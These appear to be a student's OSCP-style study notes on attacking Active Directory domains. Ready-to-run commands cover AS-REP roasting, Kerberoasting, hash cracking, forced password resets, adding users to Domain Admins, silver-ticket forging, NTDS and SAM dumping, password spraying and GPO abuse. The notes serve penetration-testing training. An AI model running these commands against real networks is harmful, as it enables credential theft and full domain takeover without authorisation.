Can begin performing these whenever you have a domain joined computer
```
Remember when attempting to authenticate to devices to specify the DOMAIN\User if using a domain account

example: if you just use Administrator, the computer will thing you are attempting to login as LOCAL Administration and not DOMAIN\Administrator
```
## AD Enum
Need to enumerate AD first
Powerview
Sharphound > bloodhound 
etc
Cant auth but have creds?
	nxc ldap ([[Netexec]]) / bloodhound-python ([[Bloodhound (legacy)|Bloodhound (legacy)]])

```
Consider rerunning as you collect new users and creds...
```

Run prebuilt queries (See [[Bloodhound (legacy)]])
Enum computers
	`MATCH (m:Computer) RETURN m
		save to computers.txt file
		`nslookup <FQDN>
			with ligolo...
Enum users
	`MATCH (m:User) Return m
		save to users.txt file
Qucik Win -- Enumerate for GenericAll/GenericWrite privs
	`MATCH (u:User)-[r:GenericAll|GenericWrite]->(t) RETURN u, r, t
		then check First Degree Object Control
look for asreprostable or kerberostable accounts
Look for shortest path to DA from Owned users!!!!!!!!!!!!!!!!!


## AD Attacks
```
Ensure you have the correct DOMAIN before proceeding...
```
#### AS-REP Roasting

```
# From Linux
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast <domain>/<user>
	The user is who we are authenticating with


# From Windows
.\Rubeus.exe asreproast /nowrap
	nowrap prevents new lines being added to hashes


# Cracking the Hashes
sudo hashcat -m 18200 hashes.asreproast rockyou.exe -r /usr/share/hashcat/rules/best64.rule --force


# Identify Users that do not require Kerberos pre-auth

Import-Module Powerview
Get-DomainUser -PreauthNotRequired

or

impacket-GetNPUsers
	run without -request and outfile
```


#### Kerberoasting

impacket-GetUserSPNs
	this will get kerberoastable account hashes if possible (Usually of service accounts)
	requires a user's creds
```
# From Linux
sudo impacket-GetUserSPNs -request -dc-ip <ip> <domain/user>

# From Windows
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Cracking the Hashes
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
	or
john hashes --wordlist=/path/to/wordlist --rules=best64
```

Targeted Kerberoast
	if we have genericall / genericwrite over a certain user we can potentially kerberoast them and get their hash, OR we can change their password
```
# Obtain kerberos hash method (preferable)

~/tools/linux/targetedKerberoast/targetedKerberoast.py -v -d '<domain>' -u '<controlled_user>' -p '<password>' --dc-ip <ip> --request-user <victim_user>
	then crack same way as above

OR

# Change user password 

method 1
net rpc password "<target_user>" "<new_password>" -U "<domain>"/"<controlled_user>"%"<password>" -S <dc_ip>

method 2
rpcclient -N  <ip_address> -U '<controlled_user>%<pass>'
$> setuserinfo2 <victim> 23 'Password123!'

```

#### Silver Tickets
Used for impersonating a LOCAL service (as opposed to golden tickets which are domain-wide)
	when we forge a ticket, we spoof ANY user (even fake accounts) for a particular service
		ie: svc_mssql as Administrator, we will be able to use xp_cmdshell (because of svc_mssql rights)
		we will still have to privesc further most likely by the end of this

Use case: 
	We have a foothold and the NTLM password hash of a service account (or cleartext password) but we cant directly authenticate as them

Benefits:
	No need to authenticate with a silver ticket to the DC
	Less risk of detection

Requirements:
	Domain SID
	Target SPN of compromised service account
	SPN Password Hash
	a user to impersonate (Administrator)


Forging a Silver Ticket
```
# Fetching requirements

Domain SID
	Get-ADDomain
	
Target SPN
	Get-ADUser -Filter {SamAccountName -eq "<svc_account_name>"} -Properties ServicePrincipalNames
	
SPN Password Hash (NTLM)
	https://codebeautify.org/ntlm-hash-generator
	if you have the cleartext password, just go to an online NTLM hash generator and convert it
	if already an NTLM hash, good to go



# Forging the Silver Ticket

From Attack Box:
impacket-ticketer -nthash <NTLM_hash> -domain-sid "<sid>" -domain <domain> -spn <SPN (NO CURLY BRACES!!!)> Administrator
	ticket will save in "Administrator.ccache" or similar
	ls                                          # to see where it was saved
	klist                                       # to verify in cache
	export KRB5CCNAME=$PWD/<ccache_name>        # adding ccache to env
	klist                                       # verify again

or

On Victim Box:
.\mimikatz.exe "kerberos::golden /sid:<sid> /domain:<domain> /ptt /target:<hostname> /service:<service> /rc4:<ntlm> /user:Administrator"
	klist     # verify


# Create /etc/krb5user.conf file (if attempting to interact from our system)

[libdefaults]    
        default_realm = <DOMAIN>   
        kdc_timesync = 1    
        ccache_type = 4    
        forwardable = true    
        proxiable = true    
    rdns = false    
    dns_canonicalize_hostname = false    
        fcc-mit-ticketflags = true    
    
[realms]            
        <DOMAIN> = {    
                kdc = <dc_hostname>.<domain>  
        }    
    
[domain_realm]    
        .<domain> = <DOMAIN>

```

why do we need the conf file?
	how i understand it is because the ticket exists on OUR kali system, so we need this conf to interact with Kerberos realms...

Example silver ticket [[OSCP Prep/Proving Grounds/Active Directory/Nagoya|Nagoya]]
	with the ticket now cached, we could authenticate to the service using kerberos authentication (usually a -k)
	need chisel as well? might need to specify 127.0.0.1

#### Group Priv Abuse (user pass change)

If a principal you have owned belongs to a group/OU which is hierarchically ABOVE another, you can force a password reset of users in that group

This can be done remotely
```
# force pass reset via RPC

rpcclient -N  <ip_address> -U '<controlled_user>%<pass>'
$> setuserinfo2 <victim> 23 'Password123!'


# net rpc version (from kali)

net rpc password "TargetUser" "Password123!" -U "DOMAIN"/"ControlledUser"%"Password" -S <dc_ip>
```
if this fails, consider resetting box (this happened to me before)


#### Adding User to Domain Groups
This is if we have GenericWrite over a domain group
	`net rpc` might work when `net group` fails
```
# net rpc method (linux)

net rpc group addmem "Domain Admins" "<Target_User>" -U '<domain>'/'<controlled_user>'%'<password>' -S <dc_ip>


# BloodyAD method

bloodyAD --host "<dc_ip>" -d "<domain>" -u "<controlled_user>" -p "<password>" add groupMember "Domain Admins" "<user>"


# net group method (windows)

net group "domain admins" <user> /add /domain


# powershell method

powershell -ep bypass
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<user>' -Credential $Cred


```

#### Abusing RPC
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

```
queryuser <user>
enumprivs

#Creating domian user
	createdomuser <user>
	setuserinfo2 <user> 24 Password123!

#Add user to domain group
	METHOD 1:
		addmemtogroup "<group>" "<user>"

	METHOD 2:
	#retrieve RIDs
		lookupnames "<group>"        # record RID
		lookupnames "<user>"         # record RID
	#convert RIDs to hex
		printf '%x\n' <RID>
	#add user to group
		`samraddmembertogroup <group_hex> <user_hex>`
	
```

#### Dumping

impacket-secretsdump see [[SecretsDump]]
	requires user account with adequate privs
	if using -hashes, format is LMHASH:NTHASH. you can just provide the NTLM hash like this
	`:<NTLM_HASH>`
```
# locally

impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> -ntds <NTDS.dit> LOCAL

# Remotely

impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target>

```

netexec
	requires user account with adequate privs
```
#domain hashes

nxc smb <ip> -u <user> -p <pass> --ntds

#local hashes

nxc smb <ip> -u <user> -p <pass> --sam
```

## Cools Tools

[Kerbrute](https://github.com/ropnop/kerbrute)
	Bruteforce and enumerate AD accounts through Kerberos Pre-Auth
	Examples
	User enumeration
		`root@kali:~# ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
	Password spray
		root@kali:~# ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123

## DACL / GPO Abuse
See [here](obsidian://open?vault=Obsidian%20Vault&file=OSCP%20Prep%2FMethodology%20Notes%2FGPO%20Abuse)

I also have the info here

IF we have DACL rights, we can modify the GPO. The easiest way is via the following:
```
# Windows

1. Upload PowerView.ps1 and it

	Import-Module .\PowerView.ps1
	.\PowerView.ps1

2. Get the Default Domain Polify (or whatever you are able to control)

	Get-GPO -Name "Default Domain Policy"

3. View Perms (bloodhound might have already tipped you that you can control it)

	Get-GPPermission -Guid <ID> -TargetType User -TargetName <user>

4. SharoGPOAbuse.exe to modify our perms to admin

	.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"

5. Force update

	gpupdate /force

6. Restart connection to box

	you are now admin


___________________________________________________

# Linux (not preferable...)

pyGPOabuse.py

```
There are other methods.

